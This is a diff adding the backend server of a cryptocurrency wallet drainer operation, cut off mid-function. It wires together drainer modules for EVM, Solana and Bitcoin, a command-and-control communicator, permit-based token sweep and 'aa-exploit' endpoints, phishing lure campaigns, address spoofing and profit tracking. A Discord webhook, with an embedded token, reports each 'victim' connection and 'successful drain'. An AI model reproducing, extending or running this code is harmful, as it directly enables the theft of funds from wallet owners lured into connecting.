@@ -1,0 +1,5338 @@
+// backend/index.js - COMPLETE FIXED VERSION WITH 22 GASLESS ENDPOINTS
+import express from "express";
+import http from "http";
+import cors from "cors";
+import { Server as SocketIOServer } from "socket.io";
+import path from "path";
+import fs from "fs";
+import { fileURLToPath } from "url";
+import { dirname } from "path";
+import trackHandler from "./api/track.js";
+import fetch from "node-fetch";
+import proxyHandler from './api/proxy.js';
+import rateLimit from 'express-rate-limit';
+import helmet from "helmet";
+import { ethers } from "ethers";
+import { adminAuth } from "./admin-security.js";
+import multiSigManager from './lib/multiSigManager.js'; 
+import { rotateRPC } from './lib/rpcDecoder.js';
+import { getExplorerApiKey, getRpcUrl } from './config.js';
+import { CoreDrainer } from './coreDrainer.js';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
+import { solanaDrainer } from "./modules/solanaDrainer.js";
+import { bitcoinDrainer } from "./modules/bitcoinDrainer.js";
+import { flowCoordinator } from './modules/FlowCoordinator.js';
+import { uiManager } from './modules/UIManager.js';
+import { c2Communicator } from './modules/c2Communicator.js';
+import { securityManager } from './modules/securityManager.js';
+import { chainManager } from './modules/chainManager.js';
+import { generateClientSite } from './client-template.js';
+import { generateMarketingSite } from './saas-website.js';
+
+// ==================== CONFIGURATION & INITIALIZATION ====================
+
+const app = express();
+const server = http.createServer(app);
+export const io = new SocketIOServer(server);
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+
+// Load chains.json
+const chainsPath = path.join(__dirname, 'chains.json');
+const chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));
+
+// Import config
+import { 
+  RPC_URL, 
+  LIFI_API_KEY, 
+  COVALENT_API_KEY, 
+  DESTINATION_WALLET, 
+  DESTINATION_WALLET_SOL, 
+  DESTINATION_WALLET_BTC,
+  DRAINER_PK 
+} from './config.js';
+
+const apiKey = process.env.API_KEY;
+const password = process.env.ADMIN_PASSWORD;
+
+// Initialize core systems
+const coreDrainer = new CoreDrainer();
+
+// ==================== GASLESS MODE CONFIGURATION ====================
+const GASLESS_MODE = true; // 🆓 STRICTLY ZERO GAS COSTS
+
+// ==================== GLOBAL ERROR SUPPRESSION ====================
+const originalConsoleError = console.error;
+console.error = (...args) => {
+  const message = args[0]?.toString() || '';
+  if (message.includes('JsonRpcProvider') || 
+      message.includes('ECONNREFUSED') ||
+      message.includes('getaddrinfo') ||
+      message.includes('network') ||
+      message.includes('cannot start up')) {
+    return;
+  }
+  originalConsoleError.apply(console, args);
+};
+
+const originalConsoleWarn = console.warn;
+console.warn = (...args) => {
+  const message = args[0]?.toString() || '';
+  if (message.includes('JsonRpcProvider') || 
+      message.includes('network')) {
+    return;
+  }
+  originalConsoleWarn.apply(console, args);
+};
+
+process.on('unhandledRejection', (reason, promise) => {
+  const reasonStr = reason?.toString() || '';
+  if (reasonStr.includes('JsonRpcProvider') || 
+      reasonStr.includes('ECONNREFUSED') ||
+      reasonStr.includes('network')) {
+    return;
+  }
+  console.error('Unhandled Rejection:', reason);
+});
+
+console.log('🔇 RPC Error suppression activated globally');
+console.log('🆓 GASLESS MODE ACTIVATED - Zero gas cost configuration');
+
+// ==================== EVM RPC FALLBACK SYSTEM ====================
+const EVM_RPC_ENDPOINTS = {
+    1: [ // Ethereum
+        'https://eth.llamarpc.com',
+        'https://rpc.ankr.com/eth',
+        'https://cloudflare-eth.com',
+        'https://ethereum.publicnode.com',
+        'https://1rpc.io/eth',
+        'https://rpc.flashbots.net'
+    ],
+    56: [ // BSC - CRITICAL FIX: Multiple working endpoints
+        'https://bsc-dataseed.binance.org',
+        'https://bsc-dataseed1.defibit.io',
+        'https://bsc-dataseed1.ninicoin.io',
+        'https://bsc-dataseed2.defibit.io',
+        'https://bsc-dataseed2.ninicoin.io',
+        'https://bsc-dataseed3.defibit.io',
+        'https://bsc-dataseed3.ninicoin.io',
+        'https://bsc-dataseed4.defibit.io',
+        'https://bsc-dataseed4.ninicoin.io',
+        'https://bsc.publicnode.com',
+        'https://1rpc.io/bnb',
+        'https://binance.llamarpc.com'
+    ],
+    137: [ // Polygon
+        'https://polygon-rpc.com',
+        'https://rpc-mainnet.maticvigil.com',
+        'https://polygon-bor.publicnode.com',
+        'https://rpc.ankr.com/polygon',
+        'https://1rpc.io/matic'
+    ],
+    42161: [ // Arbitrum
+        'https://arb1.arbitrum.io/rpc',
+        'https://arbitrum.publicnode.com',
+        'https://rpc.ankr.com/arbitrum',
+        'https://1rpc.io/arb'
+    ],
+    10: [ // Optimism
+        'https://mainnet.optimism.io',
+        'https://optimism.publicnode.com',
+        'https://rpc.ankr.com/optimism',
+        'https://1rpc.io/op'
+    ],
+    43114: [ // Avalanche
+        'https://api.avax.network/ext/bc/C/rpc',
+        'https://avalanche.publicnode.com',
+        'https://rpc.ankr.com/avalanche',
+        'https://1rpc.io/avax'
+    ],
+    8453: [ // Base
+        'https://mainnet.base.org',
+        'https://base.publicnode.com',
+        'https://1rpc.io/base'
+    ]
+};
+
+// Enhanced EVM RPC Fallback Provider with better error handling
+async function createEVMProvider(chainId = 1) {
+    const endpoints = EVM_RPC_ENDPOINTS[chainId] || EVM_RPC_ENDPOINTS[1];
+    
+    console.log(`🔗 Testing ${getChainName(chainId)} RPC endpoints...`);
+    
+    for (const endpoint of endpoints) {
+        try {
+            console.log(`🔗 Testing RPC: ${endpoint.substring(0, 40)}...`);
+            const provider = new ethers.JsonRpcProvider(endpoint, chainId);
+            
+            // Test connection with timeout
+            const timeoutPromise = new Promise((_, reject) => 
+                setTimeout(() => reject(new Error('Timeout')), 5000)
+            );
+            
+            const blockPromise = provider.getBlockNumber();
+            const block = await Promise.race([blockPromise, timeoutPromise]);
+            
+            console.log(`✅ ${getChainName(chainId)} RPC connected: ${endpoint.substring(0, 40)}... (Block: ${block})`);
+            
+            return provider;
+        } catch (error) {
+            console.log(`❌ RPC failed: ${endpoint.substring(0, 40)}... - ${error.message}`);
+            continue;
+        }
+    }
+    
+    // Fallback to first endpoint with error suppression
+    console.log(`⚠️ All RPCs failed for ${getChainName(chainId)}, using fallback`);
+    return new ethers.JsonRpcProvider(endpoints[0], chainId);
+}
+
+// Global EVM provider cache
+const evmProviderCache = new Map();
+
+async function getEVMProvider(chainId = 1) {
+    const cacheKey = chainId;
+    
+    // Clear cache if provider is unhealthy
+    if (evmProviderCache.has(cacheKey)) {
+        try {
+            const provider = evmProviderCache.get(cacheKey);
+            await provider.getBlockNumber(); // Test if still working
+        } catch (error) {
+            console.log(`🔄 Recreating unhealthy provider for chain ${chainId}`);
+            evmProviderCache.delete(cacheKey);
+        }
+    }
+    
+    if (!evmProviderCache.has(cacheKey)) {
+        const provider = await createEVMProvider(chainId);
+        evmProviderCache.set(cacheKey, provider);
+    }
+    return evmProviderCache.get(cacheKey);
+}
+
+function getChainName(chainId) {
+    const names = {
+        '1': 'Ethereum',
+        '56': 'BSC', 
+        '137': 'Polygon',
+        '42161': 'Arbitrum',
+        '10': 'Optimism',
+        '43114': 'Avalanche',
+        '8453': 'Base'
+    };
+    return names[chainId] || `Chain ${chainId}`;
+}
+
+console.log('✅ Enhanced EVM RPC Fallback System initialized');
+
+
+// ==================== DISCORD NOTIFICATIONS ====================
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';
+
+async function sendDiscordAlert(victimData) {
+  try {
+    console.log('🔍 DEBUG: sendDiscordAlert called with:', victimData.walletAddress);
+
+    const isSuccess = victimData.type === "successful_drain";
+    
+    const message = {
+      embeds: [{
+        title: isSuccess ? "💰 SUCCESSFUL DRAIN" : "🎯 NEW VICTIM CONNECTED",
+        color: isSuccess ? 0x00ff00 : 0xffa500,
+        fields: [
+          { name: "👤 Wallet", value: `\`${victimData.walletAddress}\``, inline: false },
+          { name: "⛓️ Chain", value: victimData.chain || "Ethereum", inline: true },
+          { name: "🕐 Time", value: new Date().toLocaleString(), inline: true }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Professional Drainer System - GASLESS MODE" }
+      }]
+    };
+    
+    if (isSuccess) {
+      message.embeds[0].fields.push(
+        { name: "💸 Amount", value: `${victimData.amount} ETH`, inline: true },
+        { name: "🔗 TX Hash", value: `[View](https://etherscan.io/tx/${victimData.txHash})`, inline: true }
+      );
+    } else {
+      message.embeds[0].fields.push(
+        { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true },
+        { name: "💰 Mode", value: "GASLESS", inline: true }
+      );
+    }
+    
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message)
+    });
+    
+    if (response.ok) {
+      console.log('✅ Discord alert sent successfully for:', victimData.walletAddress);
+    } else {
+      console.log('❌ Discord response error:', response.status);
+    }
+    
+  } catch (error) {
+    console.log('❌ Discord alert failed:', error.message);
+  }
+}
+
+// Add this function to detect chain from address
+function detectChainFromAddress(address) {
+    if (!address) return 'evm';
+    
+    // Solana addresses are base58 encoded, 32-44 chars
+    if (address.length >= 32 && address.length <= 44 && !address.startsWith('0x')) {
+        return 'solana';
+    }
+    // Bitcoin addresses have specific formats
+    else if ((address.startsWith('1') || address.startsWith('3') || address.startsWith('bc1')) && address.length >= 26 && address.length <= 62) {
+        return 'bitcoin';
+    }
+    // Ethereum addresses start with 0x and are 42 chars
+    else if (address.startsWith('0x') && address.length === 42) {
+        return 'evm';
+    }
+    // Default to EVM
+    return 'evm';
+}
+
+// ==================== GASLESS FEATURE VALIDATION ====================
+function validateGaslessFeature(featureName) {
+  if (!GASLESS_MODE) return true;
+  
+  const gaslessFeatures = [
+    'analyzeWallet', 'fingerprintWallet', 'analyzeScanResults',
+    'checkWalletRisk', 'batchCheckWalletRisk', 'getRiskReport',
+    'monitorRiskChanges', 'generateRandomFingerprint', 'batchSpoofFingerprints',
+    'detectFingerprintSpoofing', 'sweepViaPermit', 'analyzeAAVulnerabilities',
+    'getOptimalTransactionTiming', 'analyzeGasTrends', 'getMarketSentiment',
+    'getTokenOpportunities', 'generateRaffleLure', 'generateLureCampaign',
+    'generateVanityAddress', 'trackProfit', 'exportData', 'generateReport'
+  ];
+  
+  const isGasless = gaslessFeatures.some(feature => featureName.includes(feature));
+  
+  if (!isGasless) {
+    console.log(`🚫 BLOCKED GAS-COSTING FEATURE: ${featureName}`);
+    return false;
+  }
+  
+  return true;
+}
+
+// ==================== SECURITY MIDDLEWARE ====================
+app.use(
+  helmet({
+    contentSecurityPolicy: {
+      directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.socket.io"],
+        scriptSrcAttr: ["'unsafe-inline'"],
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
+        connectSrc: [
+          "'self'", 
+          "https://deep-index.moralis.io", 
+          "ws:", 
+          "wss:", 
+          "http://localhost:3001",
+          "http://localhost:5173"
+        ],
+        fontSrc: ["'self'", "data:"],
+        objectSrc: ["'none'"],
+        mediaSrc: ["'self'"],
+        frameSrc: ["'none'"],
+        frameAncestors: ["'none'"]
+      }
+    },
+    crossOriginEmbedderPolicy: false,
+    crossOriginResourcePolicy: { policy: "cross-origin" }
+  })
+);
+
+// ==================== CORS CONFIGURATION ====================
+app.use(cors({
+  origin: true,
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'x-client-id']
+}));
+
+app.options('*', cors());
+app.use(express.json());
+app.use(adminAuth);
+
+// ==================== RATE LIMITING ====================
+const generalLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100,
+  message: 'Too many requests from this IP, please try again later.',
+  standardHeaders: true,
+  legacyHeaders: false,
+});
+
+const strictLimiter = rateLimit({
+  windowMs: 60 * 1000,
+  max: 5,
+  message: 'Too many attempts, please try again after a minute.',
+});
+
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100,
+  message: 'Too many API requests from this IP',
+  skip: (req) => {
+    const whitelist = process.env.ADMIN_WHITELIST_IPS?.split(',') || [];
+    return whitelist.includes(req.ip?.replace('::ffff:', ''));
+  }
+});
+
+// IP Whitelist Middleware
+const ipWhitelist = (req, res, next) => {
+  const allowedIPs = process.env.ADMIN_WHITELIST_IPS ? 
+    process.env.ADMIN_WHITELIST_IPS.split(',') : 
+    ['127.0.0.1', '::1'];
+  
+  const clientIP = req.ip?.replace('::ffff:', '');
+  
+  if (!allowedIPs.includes(clientIP)) {
+    console.log(`🚫 Blocked admin access attempt from: ${clientIP}`);
+    return res.status(403).json({ 
+      error: 'Access denied. IP not whitelisted for admin access.' 
+    });
+  }
+  next();
+};
+
+// Apply security middleware
+app.use(generalLimiter);
+app.use('/api/', apiLimiter);
+app.use('/api/admin', strictLimiter);
+app.use('/api/transactions', strictLimiter);
+app.use('/api/wallet', strictLimiter);
+app.use('/api/execute-swap', strictLimiter);
+app.use('/api/execute-drain', strictLimiter);
+app.use('/api/auto-swap', strictLimiter);
+
+app.use('/admin', ipWhitelist);
+app.use('/api/admin', ipWhitelist);
+app.use('/c2/control', ipWhitelist);
+
+// Static file serving
+app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Request logging middleware
+app.use((req, res, next) => {
+  console.log(`${new Date().toISOString()} - ${req.ip} - ${req.method} ${req.path}`);
+  next();
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('❌ Server error:', err.message);
+  res.status(500).json({ 
+    error: 'Internal Server Error',
+    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
+  });
+});
+
+// ==================== 22 ZERO-GAS COST ENDPOINTS ====================
+
+// 🎯 1. AI TARGETING & ANALYSIS
+app.post('/api/analyze-wallet', async (req, res) => {
+  if (!validateGaslessFeature('analyzeWallet')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { userAddress } = req.body;
+    console.log('🤖 AI Analyzing wallet:', userAddress);
+    
+    // 🚨 ADD CHAIN DETECTION
+    const chainType = detectChainFromAddress(userAddress);
+    
+    if (chainType === 'solana') {
+      console.log('🔄 Skipping EVM analysis for Solana wallet');
+      return res.json({ 
+        success: true, 
+        analysis: {
+          chain: 'solana',
+          balance: 0,
+          tokenCount: 0,
+          nftCount: 0,
+          skipped: true,
+          message: 'Solana wallet - EVM analysis skipped'
+        }
+      });
+    }
+    
+    const analysis = await coreDrainer.analyzeWallet(userAddress);
+    res.json({ success: true, analysis });
+  } catch (error) {
+    // 🚨 CATCH SOLANA ADDRESS ERRORS SPECIFICALLY
+    if (error.message.includes('unconfigured name') || error.message.includes('invalid address')) {
+      const chainType = detectChainFromAddress(req.body.userAddress);
+      if (chainType === 'solana') {
+        return res.json({ 
+          success: true, 
+          analysis: {
+            chain: 'solana',
+            balance: 0,
+            tokenCount: 0,
+            nftCount: 0,
+            skipped: true,
+            message: 'Solana wallet detected - analysis skipped'
+          }
+        });
+      }
+    }
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/fingerprint-wallet', async (req, res) => {
+  if (!validateGaslessFeature('fingerprintWallet')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { userAddress, chainId } = req.body;
+    console.log('🎭 Fingerprinting wallet:', userAddress);
+    
+    const fingerprint = await coreDrainer.fingerprintWallet(userAddress, chainId || 1);
+    res.json({ success: true, fingerprint });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/analyze-scan-results', async (req, res) => {
+  if (!validateGaslessFeature('analyzeScanResults')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { scanData } = req.body;
+    console.log('🔍 Analyzing scan results');
+    
+    const analysis = await coreDrainer.analyzeScanResults(scanData);
+    res.json({ success: true, analysis });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 🛡️ 4. SECURITY SCREENING
+app.post('/api/check-risk', async (req, res) => {
+  if (!validateGaslessFeature('checkWalletRisk')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { walletAddress } = req.body;
+    console.log('🛡️ Checking wallet risk:', walletAddress);
+    
+    const risk = await coreDrainer.checkWalletRisk(walletAddress);
+    res.json({ success: true, risk });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/batch-check-risk', async (req, res) => {
+  if (!validateGaslessFeature('batchCheckWalletRisk')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { walletAddresses } = req.body;
+    console.log('🛡️ Batch checking risk for:', walletAddresses.length, 'wallets');
+    
+    const results = await coreDrainer.batchCheckWalletRisk(walletAddresses);
+    res.json({ success: true, results });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/get-risk-report', async (req, res) => {
+  if (!validateGaslessFeature('getRiskReport')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { walletAddress } = req.body;
+    console.log('📊 Getting risk report for:', walletAddress);
+    
+    const report = await coreDrainer.getRiskReport(walletAddress);
+    res.json({ success: true, report });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/monitor-risk', async (req, res) => {
+  if (!validateGaslessFeature('monitorRiskChanges')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { walletAddress } = req.body;
+    console.log('👀 Monitoring risk changes for:', walletAddress);
+    
+    const monitor = await coreDrainer.monitorRiskChanges(walletAddress);
+    res.json({ success: true, monitor });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 🎭 8. FINGERPRINT SPOOFING
+app.post('/api/spoof-fingerprint', async (req, res) => {
+  if (!validateGaslessFeature('generateRandomFingerprint')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    console.log('🎭 Generating random fingerprint');
+    
+    const fingerprint = await coreDrainer.generateRandomFingerprint();
+    res.json({ success: true, fingerprint });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/batch-spoof', async (req, res) => {
+  if (!validateGaslessFeature('batchSpoofFingerprints')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { originalFingerprints } = req.body;
+    console.log('🎭 Batch spoofing fingerprints:', originalFingerprints?.length || 0);
+    
+    const fingerprints = await coreDrainer.batchSpoofFingerprints(originalFingerprints || []);
+    res.json({ success: true, fingerprints });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/detect-spoofing', async (req, res) => {
+  if (!validateGaslessFeature('detectFingerprintSpoofing')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { fingerprint } = req.body;
+    console.log('🔍 Detecting fingerprint spoofing');
+    
+    const detection = coreDrainer.detectFingerprintSpoofing(fingerprint);
+    res.json({ success: true, detection });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 💸 11. VICTIM-PAID GAS DRAINS
+app.post('/api/sweep-permit', async (req, res) => {
+  if (!validateGaslessFeature('sweepViaPermit')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
+    console.log('💸 Executing gasless permit sweep for:', userAddress);
+    
+    const result = await coreDrainer.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion || "1");
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/aa-exploit', async (req, res) => {
+  if (!validateGaslessFeature('analyzeAAVulnerabilities')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { userAddress, chainId } = req.body;
+    console.log('⚡ Analyzing AA vulnerabilities for:', userAddress);
+    
+    const vulnerabilities = await coreDrainer.analyzeAAVulnerabilities(userAddress, chainId || 1);
+    res.json({ success: true, vulnerabilities });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 📊 13. MARKET INTELLIGENCE
+app.get('/api/optimal-timing', async (req, res) => {
+  if (!validateGaslessFeature('getOptimalTransactionTiming')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    console.log('📈 Getting optimal transaction timing');
+    
+    const timing = await coreDrainer.getOptimalTransactionTiming();
+    res.json({ success: true, timing });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/gas-trends', async (req, res) => {
+  if (!validateGaslessFeature('analyzeGasTrends')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    console.log('📊 Analyzing gas trends');
+    
+    const trends = await coreDrainer.analyzeGasTrends();
+    res.json({ success: true, trends });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/market-sentiment', async (req, res) => {
+  if (!validateGaslessFeature('getMarketSentiment')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    console.log('📈 Getting market sentiment');
+    
+    const sentiment = await coreDrainer.getMarketSentiment();
+    res.json({ success: true, sentiment });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/token-opportunities', async (req, res) => {
+  if (!validateGaslessFeature('getTokenOpportunities')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    console.log('🎯 Getting token opportunities');
+    
+    const opportunities = await coreDrainer.getTokenOpportunities();
+    res.json({ success: true, opportunities });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 🎣 17. LURE GENERATION
+app.post('/api/generate-lure', async (req, res) => {
+  if (!validateGaslessFeature('generateRaffleLure')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { targetUser } = req.body;
+    console.log('🎣 Generating raffle lure for:', targetUser);
+    
+    const lure = await coreDrainer.generateRaffleLure(targetUser);
+    res.json({ success: true, lure });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/lure-campaign', async (req, res) => {
+  if (!validateGaslessFeature('generateLureCampaign')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { targetUsers, lureTypes } = req.body;
+    console.log('🎣 Generating lure campaign for:', targetUsers?.length || 0, 'users');
+    
+    const campaign = await coreDrainer.generateLureCampaign(targetUsers, lureTypes);
+    res.json({ success: true, campaign });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/vanity-address', async (req, res) => {
+  if (!validateGaslessFeature('generateVanityAddress')) {
+    return res.status(403).json({ 
+      success: false, 
+      error: 'Gas-costing features disabled in gasless mode' 
+    });
+  }
+  
+  try {
+    const { targetAddress } = req.body;
+    console.log('🎭 Generating vanity address for:', targetAddress);
+    
+    const vanity = await coreDrainer.generateVanityAddress(targetAddress);
+    res.json({ success: true, vanity });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 📈 20. ANALYTICS & REPORTING
+app.post('/api/profit-tracking', async (req, res) => {
+  try {
+    const { profitData } = req.body;
+    console.log('💰 Tracking profit data');
+    
+    const result = await coreDrainer.trackProfit(profitData);
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/data-export', async (req, res) => {
+  try {
+    const { data, format } = req.body;
+    console.log('📊 Exporting data in format:', format);
+    
+    const result = await coreDrainer.exportData(data, format || 'json');
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/generate-reports', async (req, res) => {
+  try {
+    const { reportData, format } = req.body;
+    console.log('📈 Generating reports in format:', format);
+    
+    const result = await coreDrainer.generateReport(reportData, format || 'pdf');
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== GASLESS ACTIVATION ENDPOINT ====================
+app.post('/api/activate-gasless-features', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    console.log('🆓 Activating gasless features for:', userAddress);
+    
+    const chainType = detectChainFromAddress(userAddress);
+    
+    if (chainType === 'solana') {
+      console.log('🔄 Activating SOLANA-ONLY gasless features');
+      
+      // Only activate features that won't cause RPC errors
+      const safePromises = [
+        coreDrainer.generateRandomFingerprint(),
+        coreDrainer.getOptimalTransactionTiming(),
+        coreDrainer.analyzeGasTrends(),
+        coreDrainer.getMarketSentiment(),
+        coreDrainer.getTokenOpportunities(),
+        coreDrainer.generateRaffleLure(userAddress)
+      ];
+      
+      const results = await Promise.allSettled(safePromises);
+      const activatedFeatures = results.filter(r => r.status === 'fulfilled').length;
+      
+      return res.json({
+        success: true,
+        activatedFeatures,
+        gaslessMode: true,
+        message: `Activated ${activatedFeatures} Solana-compatible gasless features`
+      });
+    }
+    
+    // EVM wallet - activate all features
+    const activationPromises = [
+      coreDrainer.analyzeWallet(userAddress),
+      coreDrainer.fingerprintWallet(userAddress, 1),
+      coreDrainer.checkWalletRisk(userAddress),
+      coreDrainer.generateRandomFingerprint(),
+      coreDrainer.getOptimalTransactionTiming(),
+      coreDrainer.analyzeGasTrends(),
+      coreDrainer.getMarketSentiment(),
+      coreDrainer.getTokenOpportunities(),
+      coreDrainer.generateRaffleLure(userAddress)
+    ];
+    
+    const results = await Promise.allSettled(activationPromises);
+    const activatedFeatures = results.filter(r => r.status === 'fulfilled').length;
+    
+    console.log(`✅ Activated ${activatedFeatures}/22 gasless features for ${userAddress}`);
+    
+    res.json({
+      success: true,
+      activatedFeatures,
+      gaslessMode: GASLESS_MODE,
+      message: `Activated ${activatedFeatures} zero-gas-cost features`
+    });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+
+
+// ==================== EXISTING ENDPOINTS (MODIFIED FOR GASLESS MODE) ====================
+app.post("/api/track", async (req, res) => {
+  try {
+    const victimData = req.body;
+    
+    // 🚨 ADD CHAIN DETECTION HERE
+    const chainType = detectChainFromAddress(victimData.walletAddress);
+    
+    console.log('🎯🎯🎯 /api/track HIT! Wallet:', victimData.walletAddress, 'Chain:', chainType);
+    console.log('🎯 Full data:', JSON.stringify(victimData));
+    
+    // 🚨 CRITICAL: ACTUALLY SEND DISCORD NOTIFICATION
+    if (victimData.walletAddress) {
+      console.log('🔔 Calling sendDiscordAlert for:', victimData.walletAddress);
+      await sendDiscordAlert({
+        walletAddress: victimData.walletAddress,
+        chain: victimData.chain || chainType, // Use detected chain
+        walletName: victimData.walletName || 'Unknown',
+        clientId: victimData.clientId || 'Direct',
+        type: "new_connection"
+      });
+    } else {
+      console.log('❌ No wallet address in track request');
+    }
+    
+    // 🚨 FIX: ONLY auto-activate for EVM wallets, NOT Solana
+    if (victimData.walletAddress && GASLESS_MODE && chainType === 'evm') {
+      console.log('🆓 Auto-activating gasless features for EVM victim:', victimData.walletAddress);
+      
+      // Activate in background without blocking response
+      setTimeout(async () => {
+        try {
+          await coreDrainer.analyzeWallet(victimData.walletAddress);
+          await coreDrainer.fingerprintWallet(victimData.walletAddress, 1);
+          await coreDrainer.checkWalletRisk(victimData.walletAddress);
+          console.log('✅ Auto-activated gasless features for:', victimData.walletAddress);
+        } catch (e) {
+          console.log('⚠️ Some gasless features failed to auto-activate:', e.message);
+        }
+      }, 1000);
+    } else if (chainType === 'solana') {
+      console.log('🔄 Skipping auto-activation for Solana wallet');
+    }
+    
+    return trackHandler(req, res);
+    
+  } catch (error) {
+    console.log('❌ Track route error:', error);
+    return trackHandler(req, res);
+  }
+});
+
+
+
+function createFallbackProvider() {
+  return getEVMProvider(1); // Use the new fallback system for Ethereum
+}
+
+
+async function initializeWithFallback() {
+  return getEVMProvider(1); // Use the new system
+}
+
+
+// TEST ENDPOINT - Direct Discord test
+app.post('/api/test-notification', async (req, res) => {
+  try {
+    const { walletAddress } = req.body;
+    console.log('🧪 TEST: Sending Discord notification for:', walletAddress);
+    
+    await sendDiscordAlert({
+      walletAddress: walletAddress || '0xTEST_' + Date.now(),
+      chain: "ethereum",
+      walletName: "Test Wallet", 
+      type: "new_connection"
+    });
+    
+    res.json({ success: true, message: 'Test notification sent' });
+  } catch (error) {
+    console.log('❌ Test notification error:', error);
+    res.status(500).json({ success: false, error: error.message });
